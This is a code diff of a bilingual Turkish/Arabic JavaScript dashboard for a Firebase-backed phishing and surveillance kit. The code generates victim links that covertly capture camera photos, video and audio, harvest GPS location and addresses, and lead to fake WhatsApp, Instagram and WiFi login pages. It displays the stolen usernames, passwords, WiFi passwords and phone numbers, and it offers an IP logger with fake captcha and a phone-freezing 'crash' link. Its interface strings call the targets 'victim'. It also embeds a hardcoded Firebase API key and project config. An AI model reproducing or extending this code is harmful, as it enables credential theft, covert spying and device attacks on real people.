     import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
     import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";
 
-    const firebaseConfig = window.FIREBASE_CONFIG;
-    const app = initializeApp(firebaseConfig);
+    const fc = { apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao", authDomain: "camerahhh-15487.firebaseapp.com", projectId: "camerahhh-15487", storageBucket: "camerahhh-15487.firebasestorage.app", messagingSenderId: "212849652224", appId: "1:212849652224:web:19d8a85c01cd81005bdee5", measurementId: "G-WDVJV36W7X" };
+    const app = initializeApp(fc);
     const auth = getAuth(app);
     const db = getFirestore(app);
-    
-    const BASE_URL = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
+    const BASE = location.origin + location.pathname.replace(/\/[^/]*$/, '');
 
-    const translations = {
-        en: {
-            accessText: "ACCESS: GRANTED", myCaptures: "MY CAPTURES", totalMedia: "TOTAL MEDIA",
-            generateLink: "⟳ NORMAL CAMERA LINK", durationLabel: "🎬 VIDEO DURATION:",
-            photo1: "📸 PHOTO (1)", photo5: "📸 5 PHOTOS", videoOnly: "🎬 VIDEO (NO AUDIO)",
-            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", instagramBtn: "📱 INSTAGRAM (CHROME)",
-            refresh: "⟳ REFRESH", clearAll: "⛧ CLEAR ALL", statsInfo: "📊 STATS INFO",
-            logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
-            delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
-            loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
-            confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
-            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO",
-            crash: "💀 CRASH LINK", ipLogger: "📡 IP LOGGER + CAPTCHA", fakeWA: "🔐 FAKE WHATSAPP"
-        },
-        ar: {
-            accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
-            generateLink: "⟳ رابط الكاميرا العادي", durationLabel: "🎬 مدة الفيديو:",
-            photo1: "📸 صورة (1)", photo5: "📸 5 صور", videoOnly: "🎬 فيديو (بدون صوت)",
-            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", instagramBtn: "📱 إنستغرام (كروم)",
-            refresh: "⟳ تحديث", clearAll: "⛧ مسح الكل", statsInfo: "📊 إحصائيات",
-            logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
-            delete: "حذف", downloadAll: "⬇ تحميل الكل", noData: "[ لا توجد بيانات ]",
-            loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
-            confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
-            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت",
-            crash: "💀 رابط تجميد", ipLogger: "📡 رابط تجميع بيانات", fakeWA: "🔐 وهمي واتساب"
-        }
+    // TAM ARAPÇA ÇEVİRİ
+    const TR = {
+        access:"ONLINE",statCaptures:"ÇEKİMLER",statMedia:"MEDYA",
+        panelCamera:"KAMERA",labelDuration:"SÜRE",panelInsta:"INSTAGRAM KAMERA",labelInstaDuration:"INSTA SÜRE",
+        panelHack:"HACK ARAÇLARI",panelLocations:"KONUMLAR",badgeLocations:"GPS",
+        panelWifi:"WIFI HESAPLAR",panelAccounts:"INSTAGRAM HESAPLAR",
+        btnPhoto1:"📸 FOTO",btnPhoto5:"📸 5FOTO",btnVideo:"🎬 VİDEO",btnAudio:"🎤 SES",btnVideoAudio:"🎬🎤 V+SES",
+        btnIgPhoto:"📸 FOTO",btnIgPhoto5:"📸 5FOTO",btnIgVideo:"🎬 VİDEO",btnIgAudio:"🎤 SES",btnIgVideoAudio:"🎬🎤 V+SES",
+        btnIpLogger:"📡 IP LOGGER",btnWaFake:"🔐 WHATSAPP",btnWifiFake:"📶 WIFI FAKE",btnIgFake:"📸 INSTAGRAM",btnLocation:"📍 KONUM",btnCrash:"💀 CRASH",
+        labelRefreshLoc:"YENİLE",labelClearLoc:"TEMİZLE",labelRefreshWifi:"YENİLE",labelClearWifi:"TEMİZLE",
+        labelRefreshAcc:"YENİLE",labelClearAcc:"TEMİZLE",labelRefreshAll:"TÜMÜNÜ YENİLE",labelClearAll:"TÜM ÇEKİMLERİ SİL",
+        logout:"⛧ ÇIKIŞ",copy:"KOPYALA",linkLabel:"🔗 LİNK",del:"SİL",dl:"İNDİR",dlAll:"TÜMÜNÜ İNDİR",
+        noData:"VERİ YOK",loading:"YÜKLENİYOR...",cDel:"Bu çekim silinsin mi?",cClearAll:"TÜM çekimler silinsin mi?",
+        cClearAcc:"Tüm IG hesapları silinsin mi?",cClearLoc:"Tüm konumlar silinsin mi?",cClearWifi:"Tüm WiFi hesapları silinsin mi?",
+        sec:"sn",photo:"FOTOĞRAF",photos:"5FOTO",video:"VİDEO",audio:"SES",va:"VİDEO+SES",
+        noAcc:"HENÜZ HESAP YOK",noAccD:"Sahte Instagram linkini gönderin",
+        noLoc:"HENÜZ KONUM YOK",noLocD:"Konum linkini gönderin",
+        noWifi:"HENÜZ WIFI YOK",noWifiD:"WiFi Fake linkini gönderin",
+        instaNote:"✅ Instagram WebView'dan Chrome'a otomatik geçer",crashWarn:"⚠️ Telefonu tamamen dondurur!",
+        locNote:"📍 Kurbandan GPS + adres bilgisi alır",wifiNote:"📶 WiFi şifresi ve telefon numarası toplar",
+        username:"Kullanıcı",password:"Şifre",ip:"IP",device:"Cihaz",accuracy:"Doğruluk",coords:"Koordinat",address:"Adres",
+        googleMaps:"🗺 Google Maps'te Aç",unknown:"Bilinmiyor",deleting:"SİLİNİYOR...",error:"HATA",
+        phone:"Telefon",wifiPass:"WiFi Şifre",ssid:"Ağ",secShort:"sn"
     };
 
-    let currentLang = localStorage.getItem('app_language') || 'en';
-    let currentUser = null;
+    const AR = {
+        access:"متصل",statCaptures:"الالتقاطات",statMedia:"الوسائط",
+        panelCamera:"الكاميرا",labelDuration:"المدة",panelInsta:"كاميرا انستغرام",labelInstaDuration:"مدة انستا",
+        panelHack:"أدوات الاختراق",panelLocations:"المواقع",badgeLocations:"GPS",
+        panelWifi:"حسابات WiFi",panelAccounts:"حسابات انستغرام",
+        btnPhoto1:"📸 صورة",btnPhoto5:"📸 5 صور",btnVideo:"🎬 فيديو",btnAudio:"🎤 صوت",btnVideoAudio:"🎬🎤 فيديو+صوت",
+        btnIgPhoto:"📸 صورة",btnIgPhoto5:"📸 5 صور",btnIgVideo:"🎬 فيديو",btnIgAudio:"🎤 صوت",btnIgVideoAudio:"🎬🎤 فيديو+صوت",
+        btnIpLogger:"📡 مسجل IP",btnWaFake:"🔐 واتساب",btnWifiFake:"📶 WiFi وهمي",btnIgFake:"📸 انستغرام",btnLocation:"📍 موقع",btnCrash:"💀 تجميد",
+        labelRefreshLoc:"تحديث",labelClearLoc:"مسح",labelRefreshWifi:"تحديث",labelClearWifi:"مسح",
+        labelRefreshAcc:"تحديث",labelClearAcc:"مسح",labelRefreshAll:"تحديث الكل",labelClearAll:"مسح الالتقاطات",
+        logout:"⛧ خروج",copy:"نسخ",linkLabel:"🔗 الرابط",del:"حذف",dl:"تحميل",dlAll:"تحميل الكل",
+        noData:"لا بيانات",loading:"جاري التحميل...",cDel:"حذف هذا الالتقاط؟",cClearAll:"حذف جميع الالتقاطات؟",
+        cClearAcc:"حذف جميع حسابات IG؟",cClearLoc:"حذف جميع المواقع؟",cClearWifi:"حذف جميع حسابات WiFi؟",
+        sec:"ث",photo:"صورة",photos:"5 صور",video:"فيديو",audio:"صوت",va:"فيديو+صوت",
+        noAcc:"لا حسابات",noAccD:"أرسل رابط انستغرام الوهمي",
+        noLoc:"لا مواقع",noLocD:"أرسل رابط الموقع",
+        noWifi:"لا WiFi",noWifiD:"أرسل رابط WiFi الوهمي",
+        instaNote:"✅ تحويل تلقائي من انستغرام إلى كروم",crashWarn:"⚠️ يجمد الهاتف بالكامل!",
+        locNote:"📍 جمع GPS والعنوان من الضحية",wifiNote:"📶 جمع كلمة WiFi ورقم الهاتف",
+        username:"المستخدم",password:"كلمة المرور",ip:"IP",device:"الجهاز",accuracy:"الدقة",coords:"إحداثيات",address:"العنوان",
+        googleMaps:"🗺 فتح في خرائط جوجل",unknown:"غير معروف",deleting:"جاري المسح...",error:"خطأ",
+        phone:"هاتف",wifiPass:"كلمة WiFi",ssid:"شبكة",secShort:"ث"
+    };
 
-    function t(key) { return translations[currentLang][key] || translations.en[key]; }
+    let lang = localStorage.getItem('app_language') || 'tr';
+    let user = null;
+    let currentModalUrl = null;
+    function t(k) { return (lang === 'ar' ? AR : TR)[k] || TR[k]; }
 
-    function applyLanguage() {
-        document.getElementById('accessText').innerText = t('accessText');
-        document.getElementById('myCapturesLabel').innerText = t('myCaptures');
-        document.getElementById('totalMediaLabel').innerText = t('totalMedia');
-        document.getElementById('generateLabel').innerHTML = t('generateLink');
-        document.getElementById('durationLabel').innerHTML = t('durationLabel');
-        document.getElementById('genPhotoBtn').innerHTML = t('photo1');
-        document.getElementById('gen5PhotoBtn').innerHTML = t('photo5');
-        document.getElementById('genVideoOnlyBtn').innerHTML = t('videoOnly');
-        document.getElementById('genAudioBtn').innerHTML = t('audioOnly');
-        document.getElementById('genVideoAudioBtn').innerHTML = t('videoAudio');
-        document.getElementById('refreshBtn').innerHTML = t('refresh');
-        document.getElementById('clearAllBtn').innerHTML = t('clearAll');
-        document.getElementById('statsInfoBtn').innerHTML = t('statsInfo');
-        document.getElementById('logoutBtn').innerHTML = t('logout');
-        document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇸🇦 العربية' : '🇬🇧 English';
-        
-        // instagram butonları da aynı dil
-        document.getElementById('igPhotoBtn').innerHTML = `📸 ${t('photo1')} (INSTA)`;
-        document.getElementById('ig5PhotoBtn').innerHTML = `📸 ${t('photo5')} (INSTA)`;
-        document.getElementById('igVideoOnlyBtn').innerHTML = `🎬 ${t('videoOnly')} (INSTA)`;
-        document.getElementById('igAudioBtn').innerHTML = `🎤 ${t('audioOnly')} (INSTA)`;
-        document.getElementById('igVideoAudioBtn').innerHTML = `🎬🎤 ${t('videoAudio')} (INSTA)`;
-        
-        const val = document.getElementById('videoDuration').value;
-        document.getElementById('durationValue').innerText = val + ' ' + t('sec');
-        
-        document.body.classList.toggle('rtl', currentLang === 'ar');
-        document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    function updateFlags() {
+        document.getElementById('langTrBtn').classList.toggle('active', lang === 'tr');
+        document.getElementById('langArBtn').classList.toggle('active', lang === 'ar');
     }
 
-    document.getElementById('videoDuration').addEventListener('input', function() {
-        document.getElementById('durationValue').innerText = this.value + ' ' + t('sec');
-    });
-
-    async function loadMyData() {
-        if (!currentUser) return;
-        const listDiv = document.getElementById('list');
-        listDiv.innerHTML = `<div class="loading">${t('loading')}</div>`;
-        try {
-            const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
-            const snapshot = await getDocs(q);
-            let myData = [];
-            let totalMedia = 0;
-            snapshot.forEach(docSnap => {
-                const data = docSnap.data();
-                myData.push({ id: docSnap.id, ...data });
-                totalMedia += (data.media?.length || 0);
-            });
-            myData.sort((a, b) => (b.unix || 0) - (a.unix || 0));
-            document.getElementById('captureCount').innerText = myData.length;
-            document.getElementById('mediaCount').innerText = totalMedia;
-            if (myData.length === 0) { listDiv.innerHTML = `<div class="loading">${t('noData')}</div>`; return; }
-            let html = '';
-            for (let item of myData) {
-                const date = new Date(item.timestamp);
-                const media = item.media || [];
-                let modeText = '';
-                switch(item.mode) {
-                    case 'photo': modeText = t('photo'); break;
-                    case '5photos': modeText = t('photos'); break;
-                    case 'videoonly': modeText = t('video'); break;
-                    case 'audio': modeText = t('audio'); break;
-                    case 'videoaudio': modeText = t('videoAudioMode'); break;
-                    default: modeText = item.mode;
-                }
-                let mediaHtml = '';
-                for (let m of media) {
-                    const isVideo = m.match(/\.(mp4|webm|mov)/i);
-                    if (isVideo) mediaHtml += `<video src="${m}" onclick="showMedia('${m}', true)"></video>`;
-                    else mediaHtml += `<img src="${m}" onclick="showMedia('${m}', false)">`;
-                }
-                html += `
-                    <div class="card">
-                        <div class="card-header">
-                            <div class="ip">🌐 IP: ${item.ip || 'unknown'}</div>
-                            <div class="time">⛧ ${date.toLocaleString()} | ${modeText} ${item.duration ? '('+item.duration+' '+t('sec')+')' : ''}</div>
-                        </div>
-                        <div class="media-strip">${mediaHtml}</div>
-                        <div class="card-footer">
-                            <button class="download-btn" onclick="downloadAllMedia(${JSON.stringify(media).replace(/"/g, '&quot;')})">${t('downloadAll')}</button>
-                            <button class="delete-single" onclick="deleteCapture('${item.id}')">🗑 ${t('delete')}</button>
-                        </div>
-                    </div>
-                `;
-            }
-            listDiv.innerHTML = html;
-        } catch(err) { listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
+    // TÜM METİNLERİ GÜNCELLE
+    function applyLang() {
+        document.getElementById('accessText').innerText = t('access');
+        document.getElementById('statCaptures').innerText = t('statCaptures');
+        document.getElementById('statMedia').innerText = t('statMedia');
+        document.getElementById('panelCamera').innerText = t('panelCamera');
+        document.getElementById('labelDuration').innerText = t('labelDuration');
+        document.getElementById('panelInsta').innerText = t('panelInsta');
+        document.getElementById('labelInstaDuration').innerText = t('labelInstaDuration');
+        document.getElementById('panelHack').innerText = t('panelHack');
+        document.getElementById('panelLocations').innerText = t('panelLocations');
+        document.getElementById('badgeLocations').innerText = t('badgeLocations');
+        document.getElementById('panelWifi').innerText = t('panelWifi');
+        document.getElementById('panelAccounts').innerText = t('panelAccounts');
+        document.getElementById('btnPhoto1').innerText = t('btnPhoto1');
+        document.getElementById('btnPhoto5').innerText = t('btnPhoto5');
+        document.getElementById('btnVideo').innerText = t('btnVideo');
+        document.getElementById('btnAudio').innerText = t('btnAudio');
+        document.getElementById('btnVideoAudio').innerText = t('btnVideoAudio');
+        document.getElementById('btnIgPhoto').innerText = t('btnIgPhoto');
+        document.getElementById('btnIgPhoto5').innerText = t('btnIgPhoto5');
+        document.getElementById('btnIgVideo').innerText = t('btnIgVideo');
+        document.getElementById('btnIgAudio').innerText = t('btnIgAudio');
+        document.getElementById('btnIgVideoAudio').innerText = t('btnIgVideoAudio');
+        document.getElementById('btnIpLogger').innerText = t('btnIpLogger');
+        document.getElementById('btnWaFake').innerText = t('btnWaFake');
+        document.getElementById('btnWifiFake').innerText = t('btnWifiFake');
+        document.getElementById('btnIgFake').innerText = t('btnIgFake');
+        document.getElementById('btnLocation').innerText = t('btnLocation');
+        document.getElementById('btnCrash').innerText = t('btnCrash');
+        document.getElementById('labelRefreshLoc').innerText = t('labelRefreshLoc');
+        document.getElementById('labelClearLoc').innerText = t('labelClearLoc');
+        document.getElementById('labelRefreshWifi').innerText = t('labelRefreshWifi');
+        document.getElementById('labelClearWifi').innerText = t('labelClearWifi');
+        document.getElementById('labelRefreshAcc').innerText = t('labelRefreshAcc');
+        document.getElementById('labelClearAcc').innerText = t('labelClearAcc');
+        document.getElementById('labelRefreshAll').innerText = t('labelRefreshAll');
+        document.getElementById('labelClearAll').innerText = t('labelClearAll');
+        document.getElementById('logoutBtn').innerText = t('logout');
+        document.getElementById('durationValue').innerText = document.getElementById('videoDuration').value + t('secShort');
+        document.getElementById('igDurationValue').innerText = document.getElementById('igVideoDuration').value + t('secShort');
+        document.body.classList.toggle('rtl', lang === 'ar');
+        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+        document.documentElement.lang = lang === 'ar' ? 'ar' : 'tr';
+        updateFlags();
+        if (user) { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); }
     }
+
+    document.getElementById('videoDuration').oninput = function() {
+        document.getElementById('durationValue').innerText = this.value + t('secShort');
+    };
+    document.getElementById('igVideoDuration').oninput = function() {
+        document.getElementById('igDurationValue').innerText = this.value + t('secShort');
+    };
+    document.getElementById('langTrBtn').onclick = () => { lang = 'tr'; localStorage.setItem('app_language', lang); applyLang(); };
+    document.getElementById('langArBtn').onclick = () => { lang = 'ar'; localStorage.setItem('app_language', lang); applyLang(); };
+
+    // ============ VERİ YÜKLEME ============
     
-    window.downloadAllMedia = async (mediaUrls) => {
-        for (let url of mediaUrls) {
+    async function loadCaptures() {
+        if (!user) return;
+        const div = document.getElementById('capturesList');
+        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
+        try {
+            const snap = await getDocs(query(collection(db, "captures"), where("userId", "==", user.uid)));
+            let data = []; let tm = 0;
+            snap.forEach(d => { const x = d.data(); data.push({ id: d.id, ...x }); tm += (x.media?.length || 0); });
+            data.sort((a, b) => (b.unix || 0) - (a.unix || 0));
+            document.getElementById('captureCount').innerText = data.length;
+            document.getElementById('mediaCount').innerText = tm;
+            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noData')} ]</div>`; return; }
+            let h = '';
+            for (let it of data) {
+                const date = new Date(it.timestamp);
+                let mode = ''; switch(it.mode) { case 'photo': mode = t('photo'); break; case '5photos': mode = t('photos'); break; case 'videoonly': mode = t('video'); break; case 'audio': mode = t('audio'); break; case 'videoaudio': mode = t('va'); break; default: mode = it.mode; }
+                let mh = '';
+                for (let m of it.media || []) {
+                    const iv = m.match(/\.(mp4|webm|mov)/i);
+                    if (iv) mh += `<video src="${m}" onclick="openMedia('${m}',true)"></video>`;
+                    else mh += `<img src="${m}" onclick="openMedia('${m}',false)">`;
+                }
+                h += `<div class="media-card">
+                    <div class="media-card-header"><span class="media-card-ip">🌐 IP: ${it.ip || t('unknown')}</span><span class="media-card-time">⛧ ${date.toLocaleString(lang==='ar'?'ar-SA':'tr-TR')} | ${mode} ${it.duration?'('+it.duration+t('secShort')+')':''}</span></div>
+                    <div class="media-strip">${mh}</div>
+                    <div class="media-card-footer">
+                        <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(it.media||[]).replace(/"/g,'&quot;')})">⬇ ${t('dlAll')}</button>
+                        <button class="btn-delete" onclick="delCapture('${it.id}')">🗑 ${t('del')}</button>
+                    </div></div>`;
+            }
+            div.innerHTML = h;
+        } catch(e) { div.innerHTML = `<div class="error-text">❌ ${e.message}</div>`; }
+    }
+
+    async function loadAccounts() {
+        if (!user) return;
+        const div = document.getElementById('accountsList');
+        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
+        try {
+            const snap = await getDocs(query(collection(db, "ig_accounts"), where("ownerId", "==", user.uid)));
+            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+            data.sort((a, b) => (b.timestamp||'').localeCompare(a.timestamp||''));
+            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noAcc')} ]<span class="empty-desc">${t('noAccD')}</span></div>`; return; }
+            let h = '';
+            for (let a of data) {
+                h += `<div class="acc-card"><div class="acc-header"><span class="acc-user">👤 ${a.username||t('unknown')}</span><span class="acc-time">⛧ ${a.timestamp?new Date(a.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="acc-row">🔑 ${t('password')}: <span>${a.password||t('unknown')}</span></div><div class="acc-row">🌐 ${t('ip')}: <span>${a.ip||t('unknown')}</span></div></div>`;
+            }
+            div.innerHTML = h;
+        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+    }
+
+    async function loadLocations() {
+        if (!user) return;
+        const div = document.getElementById('locationsList');
+        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
+        try {
+            const snap = await getDocs(query(collection(db, "locations"), where("userId", "==", user.uid)));
+            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+            data.sort((a, b) => (b.unix||0) - (a.unix||0));
+            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noLoc')} ]<span class="empty-desc">${t('noLocD')}</span></div>`; return; }
+            let h = '';
+            for (let l of data) {
+                h += `<div class="loc-card"><div class="loc-header"><span class="loc-coords">📍 ${l.latitude?.toFixed(5)}, ${l.longitude?.toFixed(5)}</span><span class="loc-time">⛧ ${l.timestamp?new Date(l.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="loc-address">🏠 ${l.address||t('unknown')}</div><div class="loc-details"><span>🌐 ${t('ip')}: ${l.ip||t('unknown')}</span><span>📏 ${t('accuracy')}: ${l.accuracy?l.accuracy+'m':t('unknown')}</span></div><a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" class="btn-maps">${t('googleMaps')}</a></div>`;
+            }
+            div.innerHTML = h;
+        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+    }
+
+    async function loadWifi() {
+        if (!user) return;
+        const div = document.getElementById('wifiList');
+        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
+        try {
+            const snap = await getDocs(query(collection(db, "wifi_logs"), where("ownerId", "==", user.uid)));
+            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
+            data.sort((a, b) => (b.unix||0) - (a.unix||0));
+            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noWifi')} ]<span class="empty-desc">${t('noWifiD')}</span></div>`; return; }
+            let h = '';
+            for (let w of data) {
+                h += `<div class="wifi-card"><div class="wifi-header"><span class="wifi-ssid">📶 ${w.ssid||t('unknown')}</span><span class="wifi-time">⛧ ${w.timestamp?new Date(w.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="wifi-row">📱 ${t('phone')}: <span>${w.phone||t('unknown')}</span></div><div class="wifi-row">🔑 ${t('wifiPass')}: <span>${w.wifiPassword||t('unknown')}</span></div><div class="wifi-row">🌐 ${t('ip')}: <span>${w.ip||t('unknown')}</span></div></div>`;
+            }
+            div.innerHTML = h;
+        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
+    }
+
+    // ============ SİLME ============
+    async function clearColl(coll, field, val, confirmMsg, reloadFn) {
+        if (!user || !confirm(confirmMsg)) return;
+        const snap = await getDocs(query(collection(db, coll), where(field, "==", val)));
+        await Promise.all([...snap.docs].map(d => deleteDoc(doc(db, coll, d.id))));
+        await reloadFn();
+    }
+
+    window.delCapture = async (id) => { if (!confirm(t('cDel'))) return; await deleteDoc(doc(db, "captures", id)); await loadCaptures(); };
+    
+    window.downloadAllMedia = async (urls) => {
+        for (let u of urls) {
             const a = document.createElement('a');
-            a.href = url;
-            a.download = url.split('/').pop().split('?')[0] || 'media';
+            a.href = u;
+            a.download = u.split('/').pop()?.split('?')[0] || 'media';
             a.target = '_blank';
+            document.body.appendChild(a);
             a.click();
+            document.body.removeChild(a);
             await new Promise(r => setTimeout(r, 300));
         }
     };
-    window.showMedia = (url, isVideo) => {
+
+    // MODAL: Aç + İndir butonu
+    window.openMedia = (url, isVideo) => {
+        currentModalUrl = url;
         const modal = document.getElementById('modal');
-        const modalContent = document.getElementById('modalContent');
-        if (isVideo) modalContent.innerHTML = `<video src="${url}" controls autoplay style="max-width:95%; max-height:95%;"></video>`;
-        else modalContent.innerHTML = `<img src="${url}" style="max-width:95%; max-height:95%;">`;
+        const content = document.getElementById('modalContent');
+        const dlBtn = document.getElementById('modalDownloadBtn');
+        
+        if (isVideo) content.innerHTML = `<video src="${url}" controls autoplay style="max-width:94%;max-height:88%;border-radius:14px;"></video>`;
+        else content.innerHTML = `<img src="${url}" style="max-width:94%;max-height:88%;border-radius:14px;cursor:default;">`;
+        
+        dlBtn.style.display = 'block';
+        dlBtn.onclick = () => {
+            const a = document.createElement('a');
+            a.href = currentModalUrl;
+            a.download = currentModalUrl.split('/').pop()?.split('?')[0] || 'download';
+            a.target = '_blank';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        };
+        
         modal.style.display = 'flex';
     };
-    window.deleteCapture = async (id) => {
-        if (!confirm(t('confirmDelete'))) return;
-        await deleteDoc(doc(db, "captures", id));
-        await loadMyData();
-    };
-    async function clearAll() {
-        if (!confirm(t('confirmClearAll'))) return;
-        const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
-        const snapshot = await getDocs(q);
-        for (const docSnap of snapshot.docs) await deleteDoc(doc(db, "captures", docSnap.id));
-        await loadMyData();
+
+    function closeModal() {
+        document.getElementById('modal').style.display = 'none';
+        document.getElementById('modalContent').innerHTML = '';
+        document.getElementById('modalDownloadBtn').style.display = 'none';
+        currentModalUrl = null;
     }
-    
-    function generateLink(mode, isInstagram = false) {
-        if (!currentUser) return;
-        let targetUrl = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
-        if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
-            targetUrl += `&duration=${document.getElementById('videoDuration').value}`;
+
+    document.getElementById('modal').addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
+    });
+    document.getElementById('modalClose').addEventListener('click', closeModal);
+
+    // ============ LİNK OLUŞTURMA ============
+    function genLink(mode, isIg = false) {
+        if (!user) return;
+        let url = `${BASE}/?mode=${mode}&uid=${user.uid}`;
+        if (['videoonly','videoaudio','audio'].includes(mode)) {
+            url += `&duration=${isIg ? document.getElementById('igVideoDuration').value : document.getElementById('videoDuration').value}`;
         }
-        if (isInstagram) targetUrl += `&force_chrome=1`;
-        const outputDiv = isInstagram ? document.getElementById('igLinkOutput') : document.getElementById('linkOutput');
-        outputDiv.innerHTML = `${t('linkLabel')} <a href="${targetUrl}" target="_blank" style="color:#00ff41">${targetUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${targetUrl}')">${t('copy')}</button>`;
-        if(isInstagram) outputDiv.innerHTML += `<br><small style="color:#ff3366;">✅ Instagram WebView'da otomatik Chrome'a yönlendirir</small>`;
+        if (isIg) url += '&force_chrome=1';
+        const div = isIg ? document.getElementById('outputInsta') : document.getElementById('outputCamera');
+        div.innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
+        if (isIg) div.innerHTML += `<span class="output-note red">${t('instaNote')}</span>`;
     }
-    
-    // HACK TOOL 1: IP LOGGER + FAKE CAPTCHA
-    function generateIPLogger() {
-        if (!currentUser) return;
-        const hackUrl = `${BASE_URL}/hack/iplogger.html?uid=${currentUser.uid}&redirect=https://google.com`;
-        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📡 IP LOGGER + CAPTCHA: <a href="${hackUrl}" target="_blank" style="color:#ffaa00">${hackUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${hackUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">Kurbana gönder. IP, cihaz, tarayıcı bilgisi toplar + sahte captcha</small>`;
+
+    function genHack(type) {
+        if (!user) return;
+        let url = '', note = '', cls = '';
+        switch(type) {
+            case 'ip': url = `${BASE}/hack/iplogger.html?uid=${user.uid}&redirect=https://google.com`; break;
+            case 'wa': url = `${BASE}/hack/fakewhatsapp.html?uid=${user.uid}`; break;
+            case 'wifi': url = `${BASE}/hack/fake_wifi.html?uid=${user.uid}`; note = t('wifiNote'); cls = 'cyan-link'; break;
+            case 'ig': url = `${BASE}/hack/instagram_login.html?uid=${user.uid}`; break;
+            case 'loc': url = `${BASE}/?mode=location&uid=${user.uid}`; note = t('locNote'); cls = 'cyan-link'; break;
+            case 'crash': url = `${BASE}/hack/ariha_hacker.html`; note = t('crashWarn'); cls = 'crash-link'; break;
+        }
+        document.getElementById('outputHack').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" class="${cls}">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>${note?`<span class="output-note ${type==='crash'?'red':'cyan'}">${note}</span>`:''}`;
     }
+
+    // ============ EVENTLER ============
+    document.getElementById('btnPhoto1').onclick = () => genLink('photo');
+    document.getElementById('btnPhoto5').onclick = () => genLink('5photos');
+    document.getElementById('btnVideo').onclick = () => genLink('videoonly');
+    document.getElementById('btnAudio').onclick = () => genLink('audio');
+    document.getElementById('btnVideoAudio').onclick = () => genLink('videoaudio');
     
-    // HACK TOOL 2: FAKE WHATSAPP LOGIN
-    function generateFakeWA() {
-        if (!currentUser) return;
-        const waUrl = `${BASE_URL}/hack/fakewhatsapp.html?uid=${currentUser.uid}`;
-        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 🔐 FAKE WHATSAPP LOGIN: <a href="${waUrl}" target="_blank" style="color:#ffaa00">${waUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${waUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">WhatsApp Web sahte giriş sayfası. Şifre ve telefon numarasını çalar.</small>`;
-    }
+    document.getElementById('btnIgPhoto').onclick = () => genLink('photo', true);
+    document.getElementById('btnIgPhoto5').onclick = () => genLink('5photos', true);
+    document.getElementById('btnIgVideo').onclick = () => genLink('videoonly', true);
+    document.getElementById('btnIgAudio').onclick = () => genLink('audio', true);
+    document.getElementById('btnIgVideoAudio').onclick = () => genLink('videoaudio', true);
     
-    function generateCrash() {
-        if (!currentUser) return;
-        const crashUrl = `${BASE_URL}/?crash=1&uid=${currentUser.uid}`;
